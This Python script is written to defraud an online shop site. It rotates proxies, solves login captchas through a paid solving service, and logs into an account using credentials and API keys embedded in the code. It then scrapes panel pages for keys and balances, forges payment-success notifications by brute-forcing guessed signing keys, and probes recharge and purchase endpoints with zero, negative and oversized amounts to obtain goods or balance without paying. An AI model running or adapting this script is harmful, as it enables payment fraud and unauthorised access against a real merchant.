#!/usr/bin/env python3
"""Login fenzhan → create recharge → forge payment notify / negative money tricks."""
import json
import re
import subprocess
import time
import urllib.parse
import hashlib
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep9")
LOG = OUT / "recharge.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "rc.jar")
KEY2 = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
USER, PASS = "p4764923", "Test64923x"
_px = None


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def fresh():
    global _px
    for area in ("440000", "0"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS" or not d.get("data"):
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                    text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t9.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t9.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px {e}")
        time.sleep(0.5)
    return _px


def curl(url, post=None, mt=20, referer=None, method=None):
    global _px
    if not _px:
        fresh()
    for _ in range(5):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", f"Referer: {referer or BASE + '/'}",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", method or "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 8).stdout or ""
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh(); continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def solve(gt, challenge):
    task = {"type": "GeeTestTaskProxyless", "websiteURL": BASE + "/user/login.php",
            "gt": gt, "challenge": challenge}
    d = json.loads(subprocess.check_output(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", json.dumps({"clientKey": KEY2, "task": task}),
         "https://api.2captcha.com/createTask"], text=True, timeout=35))
    if d.get("errorId"):
        raise RuntimeError(str(d))
    tid = d["taskId"]
    log(f"task {tid}")
    for _ in range(35):
        time.sleep(4)
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": KEY2, "taskId": tid}),
             "https://api.2captcha.com/getTaskResult"], text=True, timeout=25))
        if d.get("errorId"):
            raise RuntimeError(str(d))
        if d.get("status") == "ready":
            return d["solution"]
    raise RuntimeError("timeout")


def login():
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/user/login.php")
    for attempt in range(6):
        try:
            cap_b, _ = curl(BASE + f"/ajax.php?act=captcha&t={int(time.time()*1000)}")
            cap = json.loads(cap_b)
            sol = solve(cap["gt"], cap["challenge"])
        except Exception as e:
            log(f"cap {e}"); continue
        b, c = curl(BASE + "/user/ajax.php?act=login", {
            "user": USER, "pass": PASS,
            "geetest_challenge": sol.get("challenge") or cap["challenge"],
            "geetest_validate": sol.get("validate", ""),
            "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan"),
        }, referer=BASE + "/user/login.php")
        log(f"login {attempt}: {c} {(b or '')[:200]}")
        if b and ('"code":0' in b or '"code":1' in b or "成功" in b):
            hit("login_ok", USER, b)
            return True
    return False


def forge_notify(trade_no, money="1.00", name="recharge"):
    """Try common epay MD5 sign patterns with guessed keys."""
    pids = ["1000", "1001", "1", "10001", "2024", "8888"]
    keys = ["", "123456", "key", "epay", "qq1", "buyi", "qqkqq", "faka", "caihong",
            "password", "admin", "123456789", USER, PASS]
    results = []
    for pid in pids:
        for key in keys:
            params = {
                "pid": pid,
                "trade_no": trade_no,
                "out_trade_no": trade_no,
                "type": "alipay",
                "name": name,
                "money": money,
                "trade_status": "TRADE_SUCCESS",
            }
            # epay classic: sign = md5(sorted key=val & + key)
            items = sorted((k, v) for k, v in params.items())
            s = "&".join(f"{k}={v}" for k, v in items)
            sign = hashlib.md5((s + key).encode()).hexdigest()
            params["sign"] = sign
            params["sign_type"] = "MD5"
            # also alternate: md5 without empty, md5(pid+trade_no+money+key)
            alts = [
                params,
                {**params, "sign": hashlib.md5(f"{pid}{trade_no}{money}{key}".encode()).hexdigest()},
                {**params, "sign": hashlib.md5((s + "&key=" + key).encode()).hexdigest()},
            ]
            for p in alts:
                for path in ("/other/epay_notify.php", "/other/alipay_notify.php", "/other/notify.php"):
                    b, c = curl(BASE + path, p)
                    if b and b.strip().lower() in ("success", "ok", "success\n"):
                        hit("NOTIFY_OK", f"{path} pid={pid} key={key}", b)
                        return True
                    if b and "签名失败" not in b and "error" not in b.lower() and "fail" not in b.lower():
                        if b.strip() and len(b) < 80:
                            log(f"  odd notify {path} pid={pid} key={key!r}: {b[:80]}")
                            results.append((path, pid, key, b[:80]))
                # GET style
                b, c = curl(BASE + "/other/epay_notify.php?" + urllib.parse.urlencode(params))
                if b and b.strip().lower() == "success":
                    hit("NOTIFY_OK_GET", f"pid={pid} key={key}", b)
                    return True
            time.sleep(0.05)
    log(f"forge no success; odd={results[:5]}")
    return False


def main():
    open(LOG, "w").write("")
    log("=== RECHARGE FORGE ===")
    fresh()
    if not login():
        log("login failed"); return

    # dump panel pages for apikey / money
    for p in ["/user/", "/user/index.php", "/user/recharge.php", "/user/uset.php",
              "/user/shop.php", "/user/site.php", "/user/domain.php", "/user/list.php"]:
        b, c = curl(BASE + p, referer=BASE + "/user/")
        log(f"page {p}: {c} len={len(b or '')}")
        (OUT / ("rc_" + p.strip("/").replace("/", "_") + ".html")).write_text(b or "", errors="replace")
        if b and any(x in b for x in ("apikey", "API密钥", "对接密钥", "余额", "money")):
            # extract snippets
            for m in re.finditer(r'.{0,40}(apikey|API|密钥|余额|rmb).{0,60}', b, re.I):
                log(f"  snip: {m.group(0).replace(chr(10),' ')[:120]}")

    # userinfo
    for act in ("userinfo", "getuser", "getmoney", "getsite", "getconfig"):
        b, c = curl(BASE + f"/user/ajax.php?act={act}", {}, referer=BASE + "/user/")
        log(f"ajax {act}: {c} {(b or '')[:250]}")
        if b and "No Act" not in b:
            hit("authed_ajax", act, b)

    # create recharge orders with weird amounts
    log("=== RECHARGE CREATE ===")
    trade_nos = []
    for money in ("1", "0.01", "0", "-1", "0.1", "189", "99999"):
        for typ in ("alipay", "qqpay", "wxpay", "rmb"):
            for endpoint in (
                BASE + "/user/ajax.php?act=recharge",
                BASE + "/ajax.php?act=recharge",
            ):
                b, c = curl(endpoint, {"money": money, "type": typ}, referer=BASE + "/user/recharge.php")
                if "No Act" in (b or ""):
                    continue
                log(f"recharge money={money} type={typ}: {c} {(b or '')[:200]}")
                if b and ("trade_no" in b or "orderid" in b or "url" in b or "成功" in b):
                    hit("recharge_created", f"{money}/{typ}", b)
                    try:
                        j = json.loads(b)
                        tn = j.get("trade_no") or j.get("orderid")
                        if tn:
                            trade_nos.append((tn, money))
                    except Exception:
                        pass
                    # follow pay url
                    if "url" in (b or ""):
                        try:
                            u = json.loads(b).get("url")
                            if u:
                                b2, c2 = curl(u if u.startswith("http") else BASE + u)
                                log(f"  follow: {c2} len={len(b2 or '')} {(b2 or '')[:150]}")
                                (OUT / f"recharge_pay_{money}_{typ}.html").write_text(b2 or "", errors="replace")
                        except Exception:
                            pass
                time.sleep(0.2)

    # also try submit.php recharge style
    page, _ = curl(BASE + "/user/recharge.php")
    for m in re.findall(r'(submit\.php[^"\']+|recharge[^"\']+|trade_no=[^"\']+)', page or ""):
        log(f"recharge page ref: {m[:120]}")

    # forge notify for any trade_nos we got + a synthetic one
    log("=== FORGE NOTIFY ===")
    if not trade_nos:
        # create unpaid shop order to get trade_no shape, then try notify anyway
        home, _ = curl(BASE + "/")
        hs = None
        m = re.search(r"var hashsalt=(.+);", home or "")
        if m:
            try:
                hs = subprocess.run(
                    ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
                    capture_output=True, text=True, timeout=5).stdout.strip()
            except Exception:
                pass
        csrf = None
        m = re.search(r'csrf_token\s*=\s*"([^"]+)"', home or "")
        if m:
            csrf = m.group(1)
        pay = {
            "tid": "4", "num": "1", "inputvalue": "rc@" + USER,
            "hashsalt": hs or "x",
            "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
        }
        if csrf:
            pay["csrf_token"] = csrf
        b, c = curl(BASE + "/ajax.php?act=pay", pay)
        log(f"shop pay: {c} {(b or '')[:200]}")
        try:
            tn = json.loads(b).get("trade_no")
            if tn:
                trade_nos.append((tn, "189"))
        except Exception:
            pass

    for tn, money in trade_nos[:3]:
        log(f"forging for {tn} money={money}")
        forge_notify(tn, money=str(money))
        # after forge check balance via API pay
        b, c = curl(f"{BASE}/%61pi.php?act=pay", {
            "user": USER, "pass": PASS, "tid": "4", "num": "1", "input1": "afterforge",
        })
        log(f"api pay after forge: {c} {(b or '')[:200]}")
        if b and "余额不足" not in b and ("trade_no" in b or "成功" in b or "kami" in b):
            hit("BALANCE_OR_CARD", tn, b)

    # negative / zero price API pay tricks
    log("=== PRICE TRICKS ===")
    for extra in [
        {"tid": "4", "num": "0", "input1": "x"},
        {"tid": "4", "num": "-1", "input1": "x"},
        {"tid": "4", "num": "1", "price": "0", "input1": "x"},
        {"tid": "4", "num": "1", "money": "0", "input1": "x"},
        {"tid": "118", "num": "1", "input1": "x"},  # cheaper?
    ]:
        b, c = curl(f"{BASE}/%61pi.php?act=pay", {"user": USER, "pass": PASS, **extra})
        log(f"trick {extra}: {c} {(b or '')[:180]}")
        if b and "余额不足" not in b and "错误" not in b and ("成功" in b or "kami" in b or "trade_no" in b):
            hit("price_trick", str(extra), b)

    log("=== RECHARGE DONE ===")


if __name__ == "__main__":
    main()
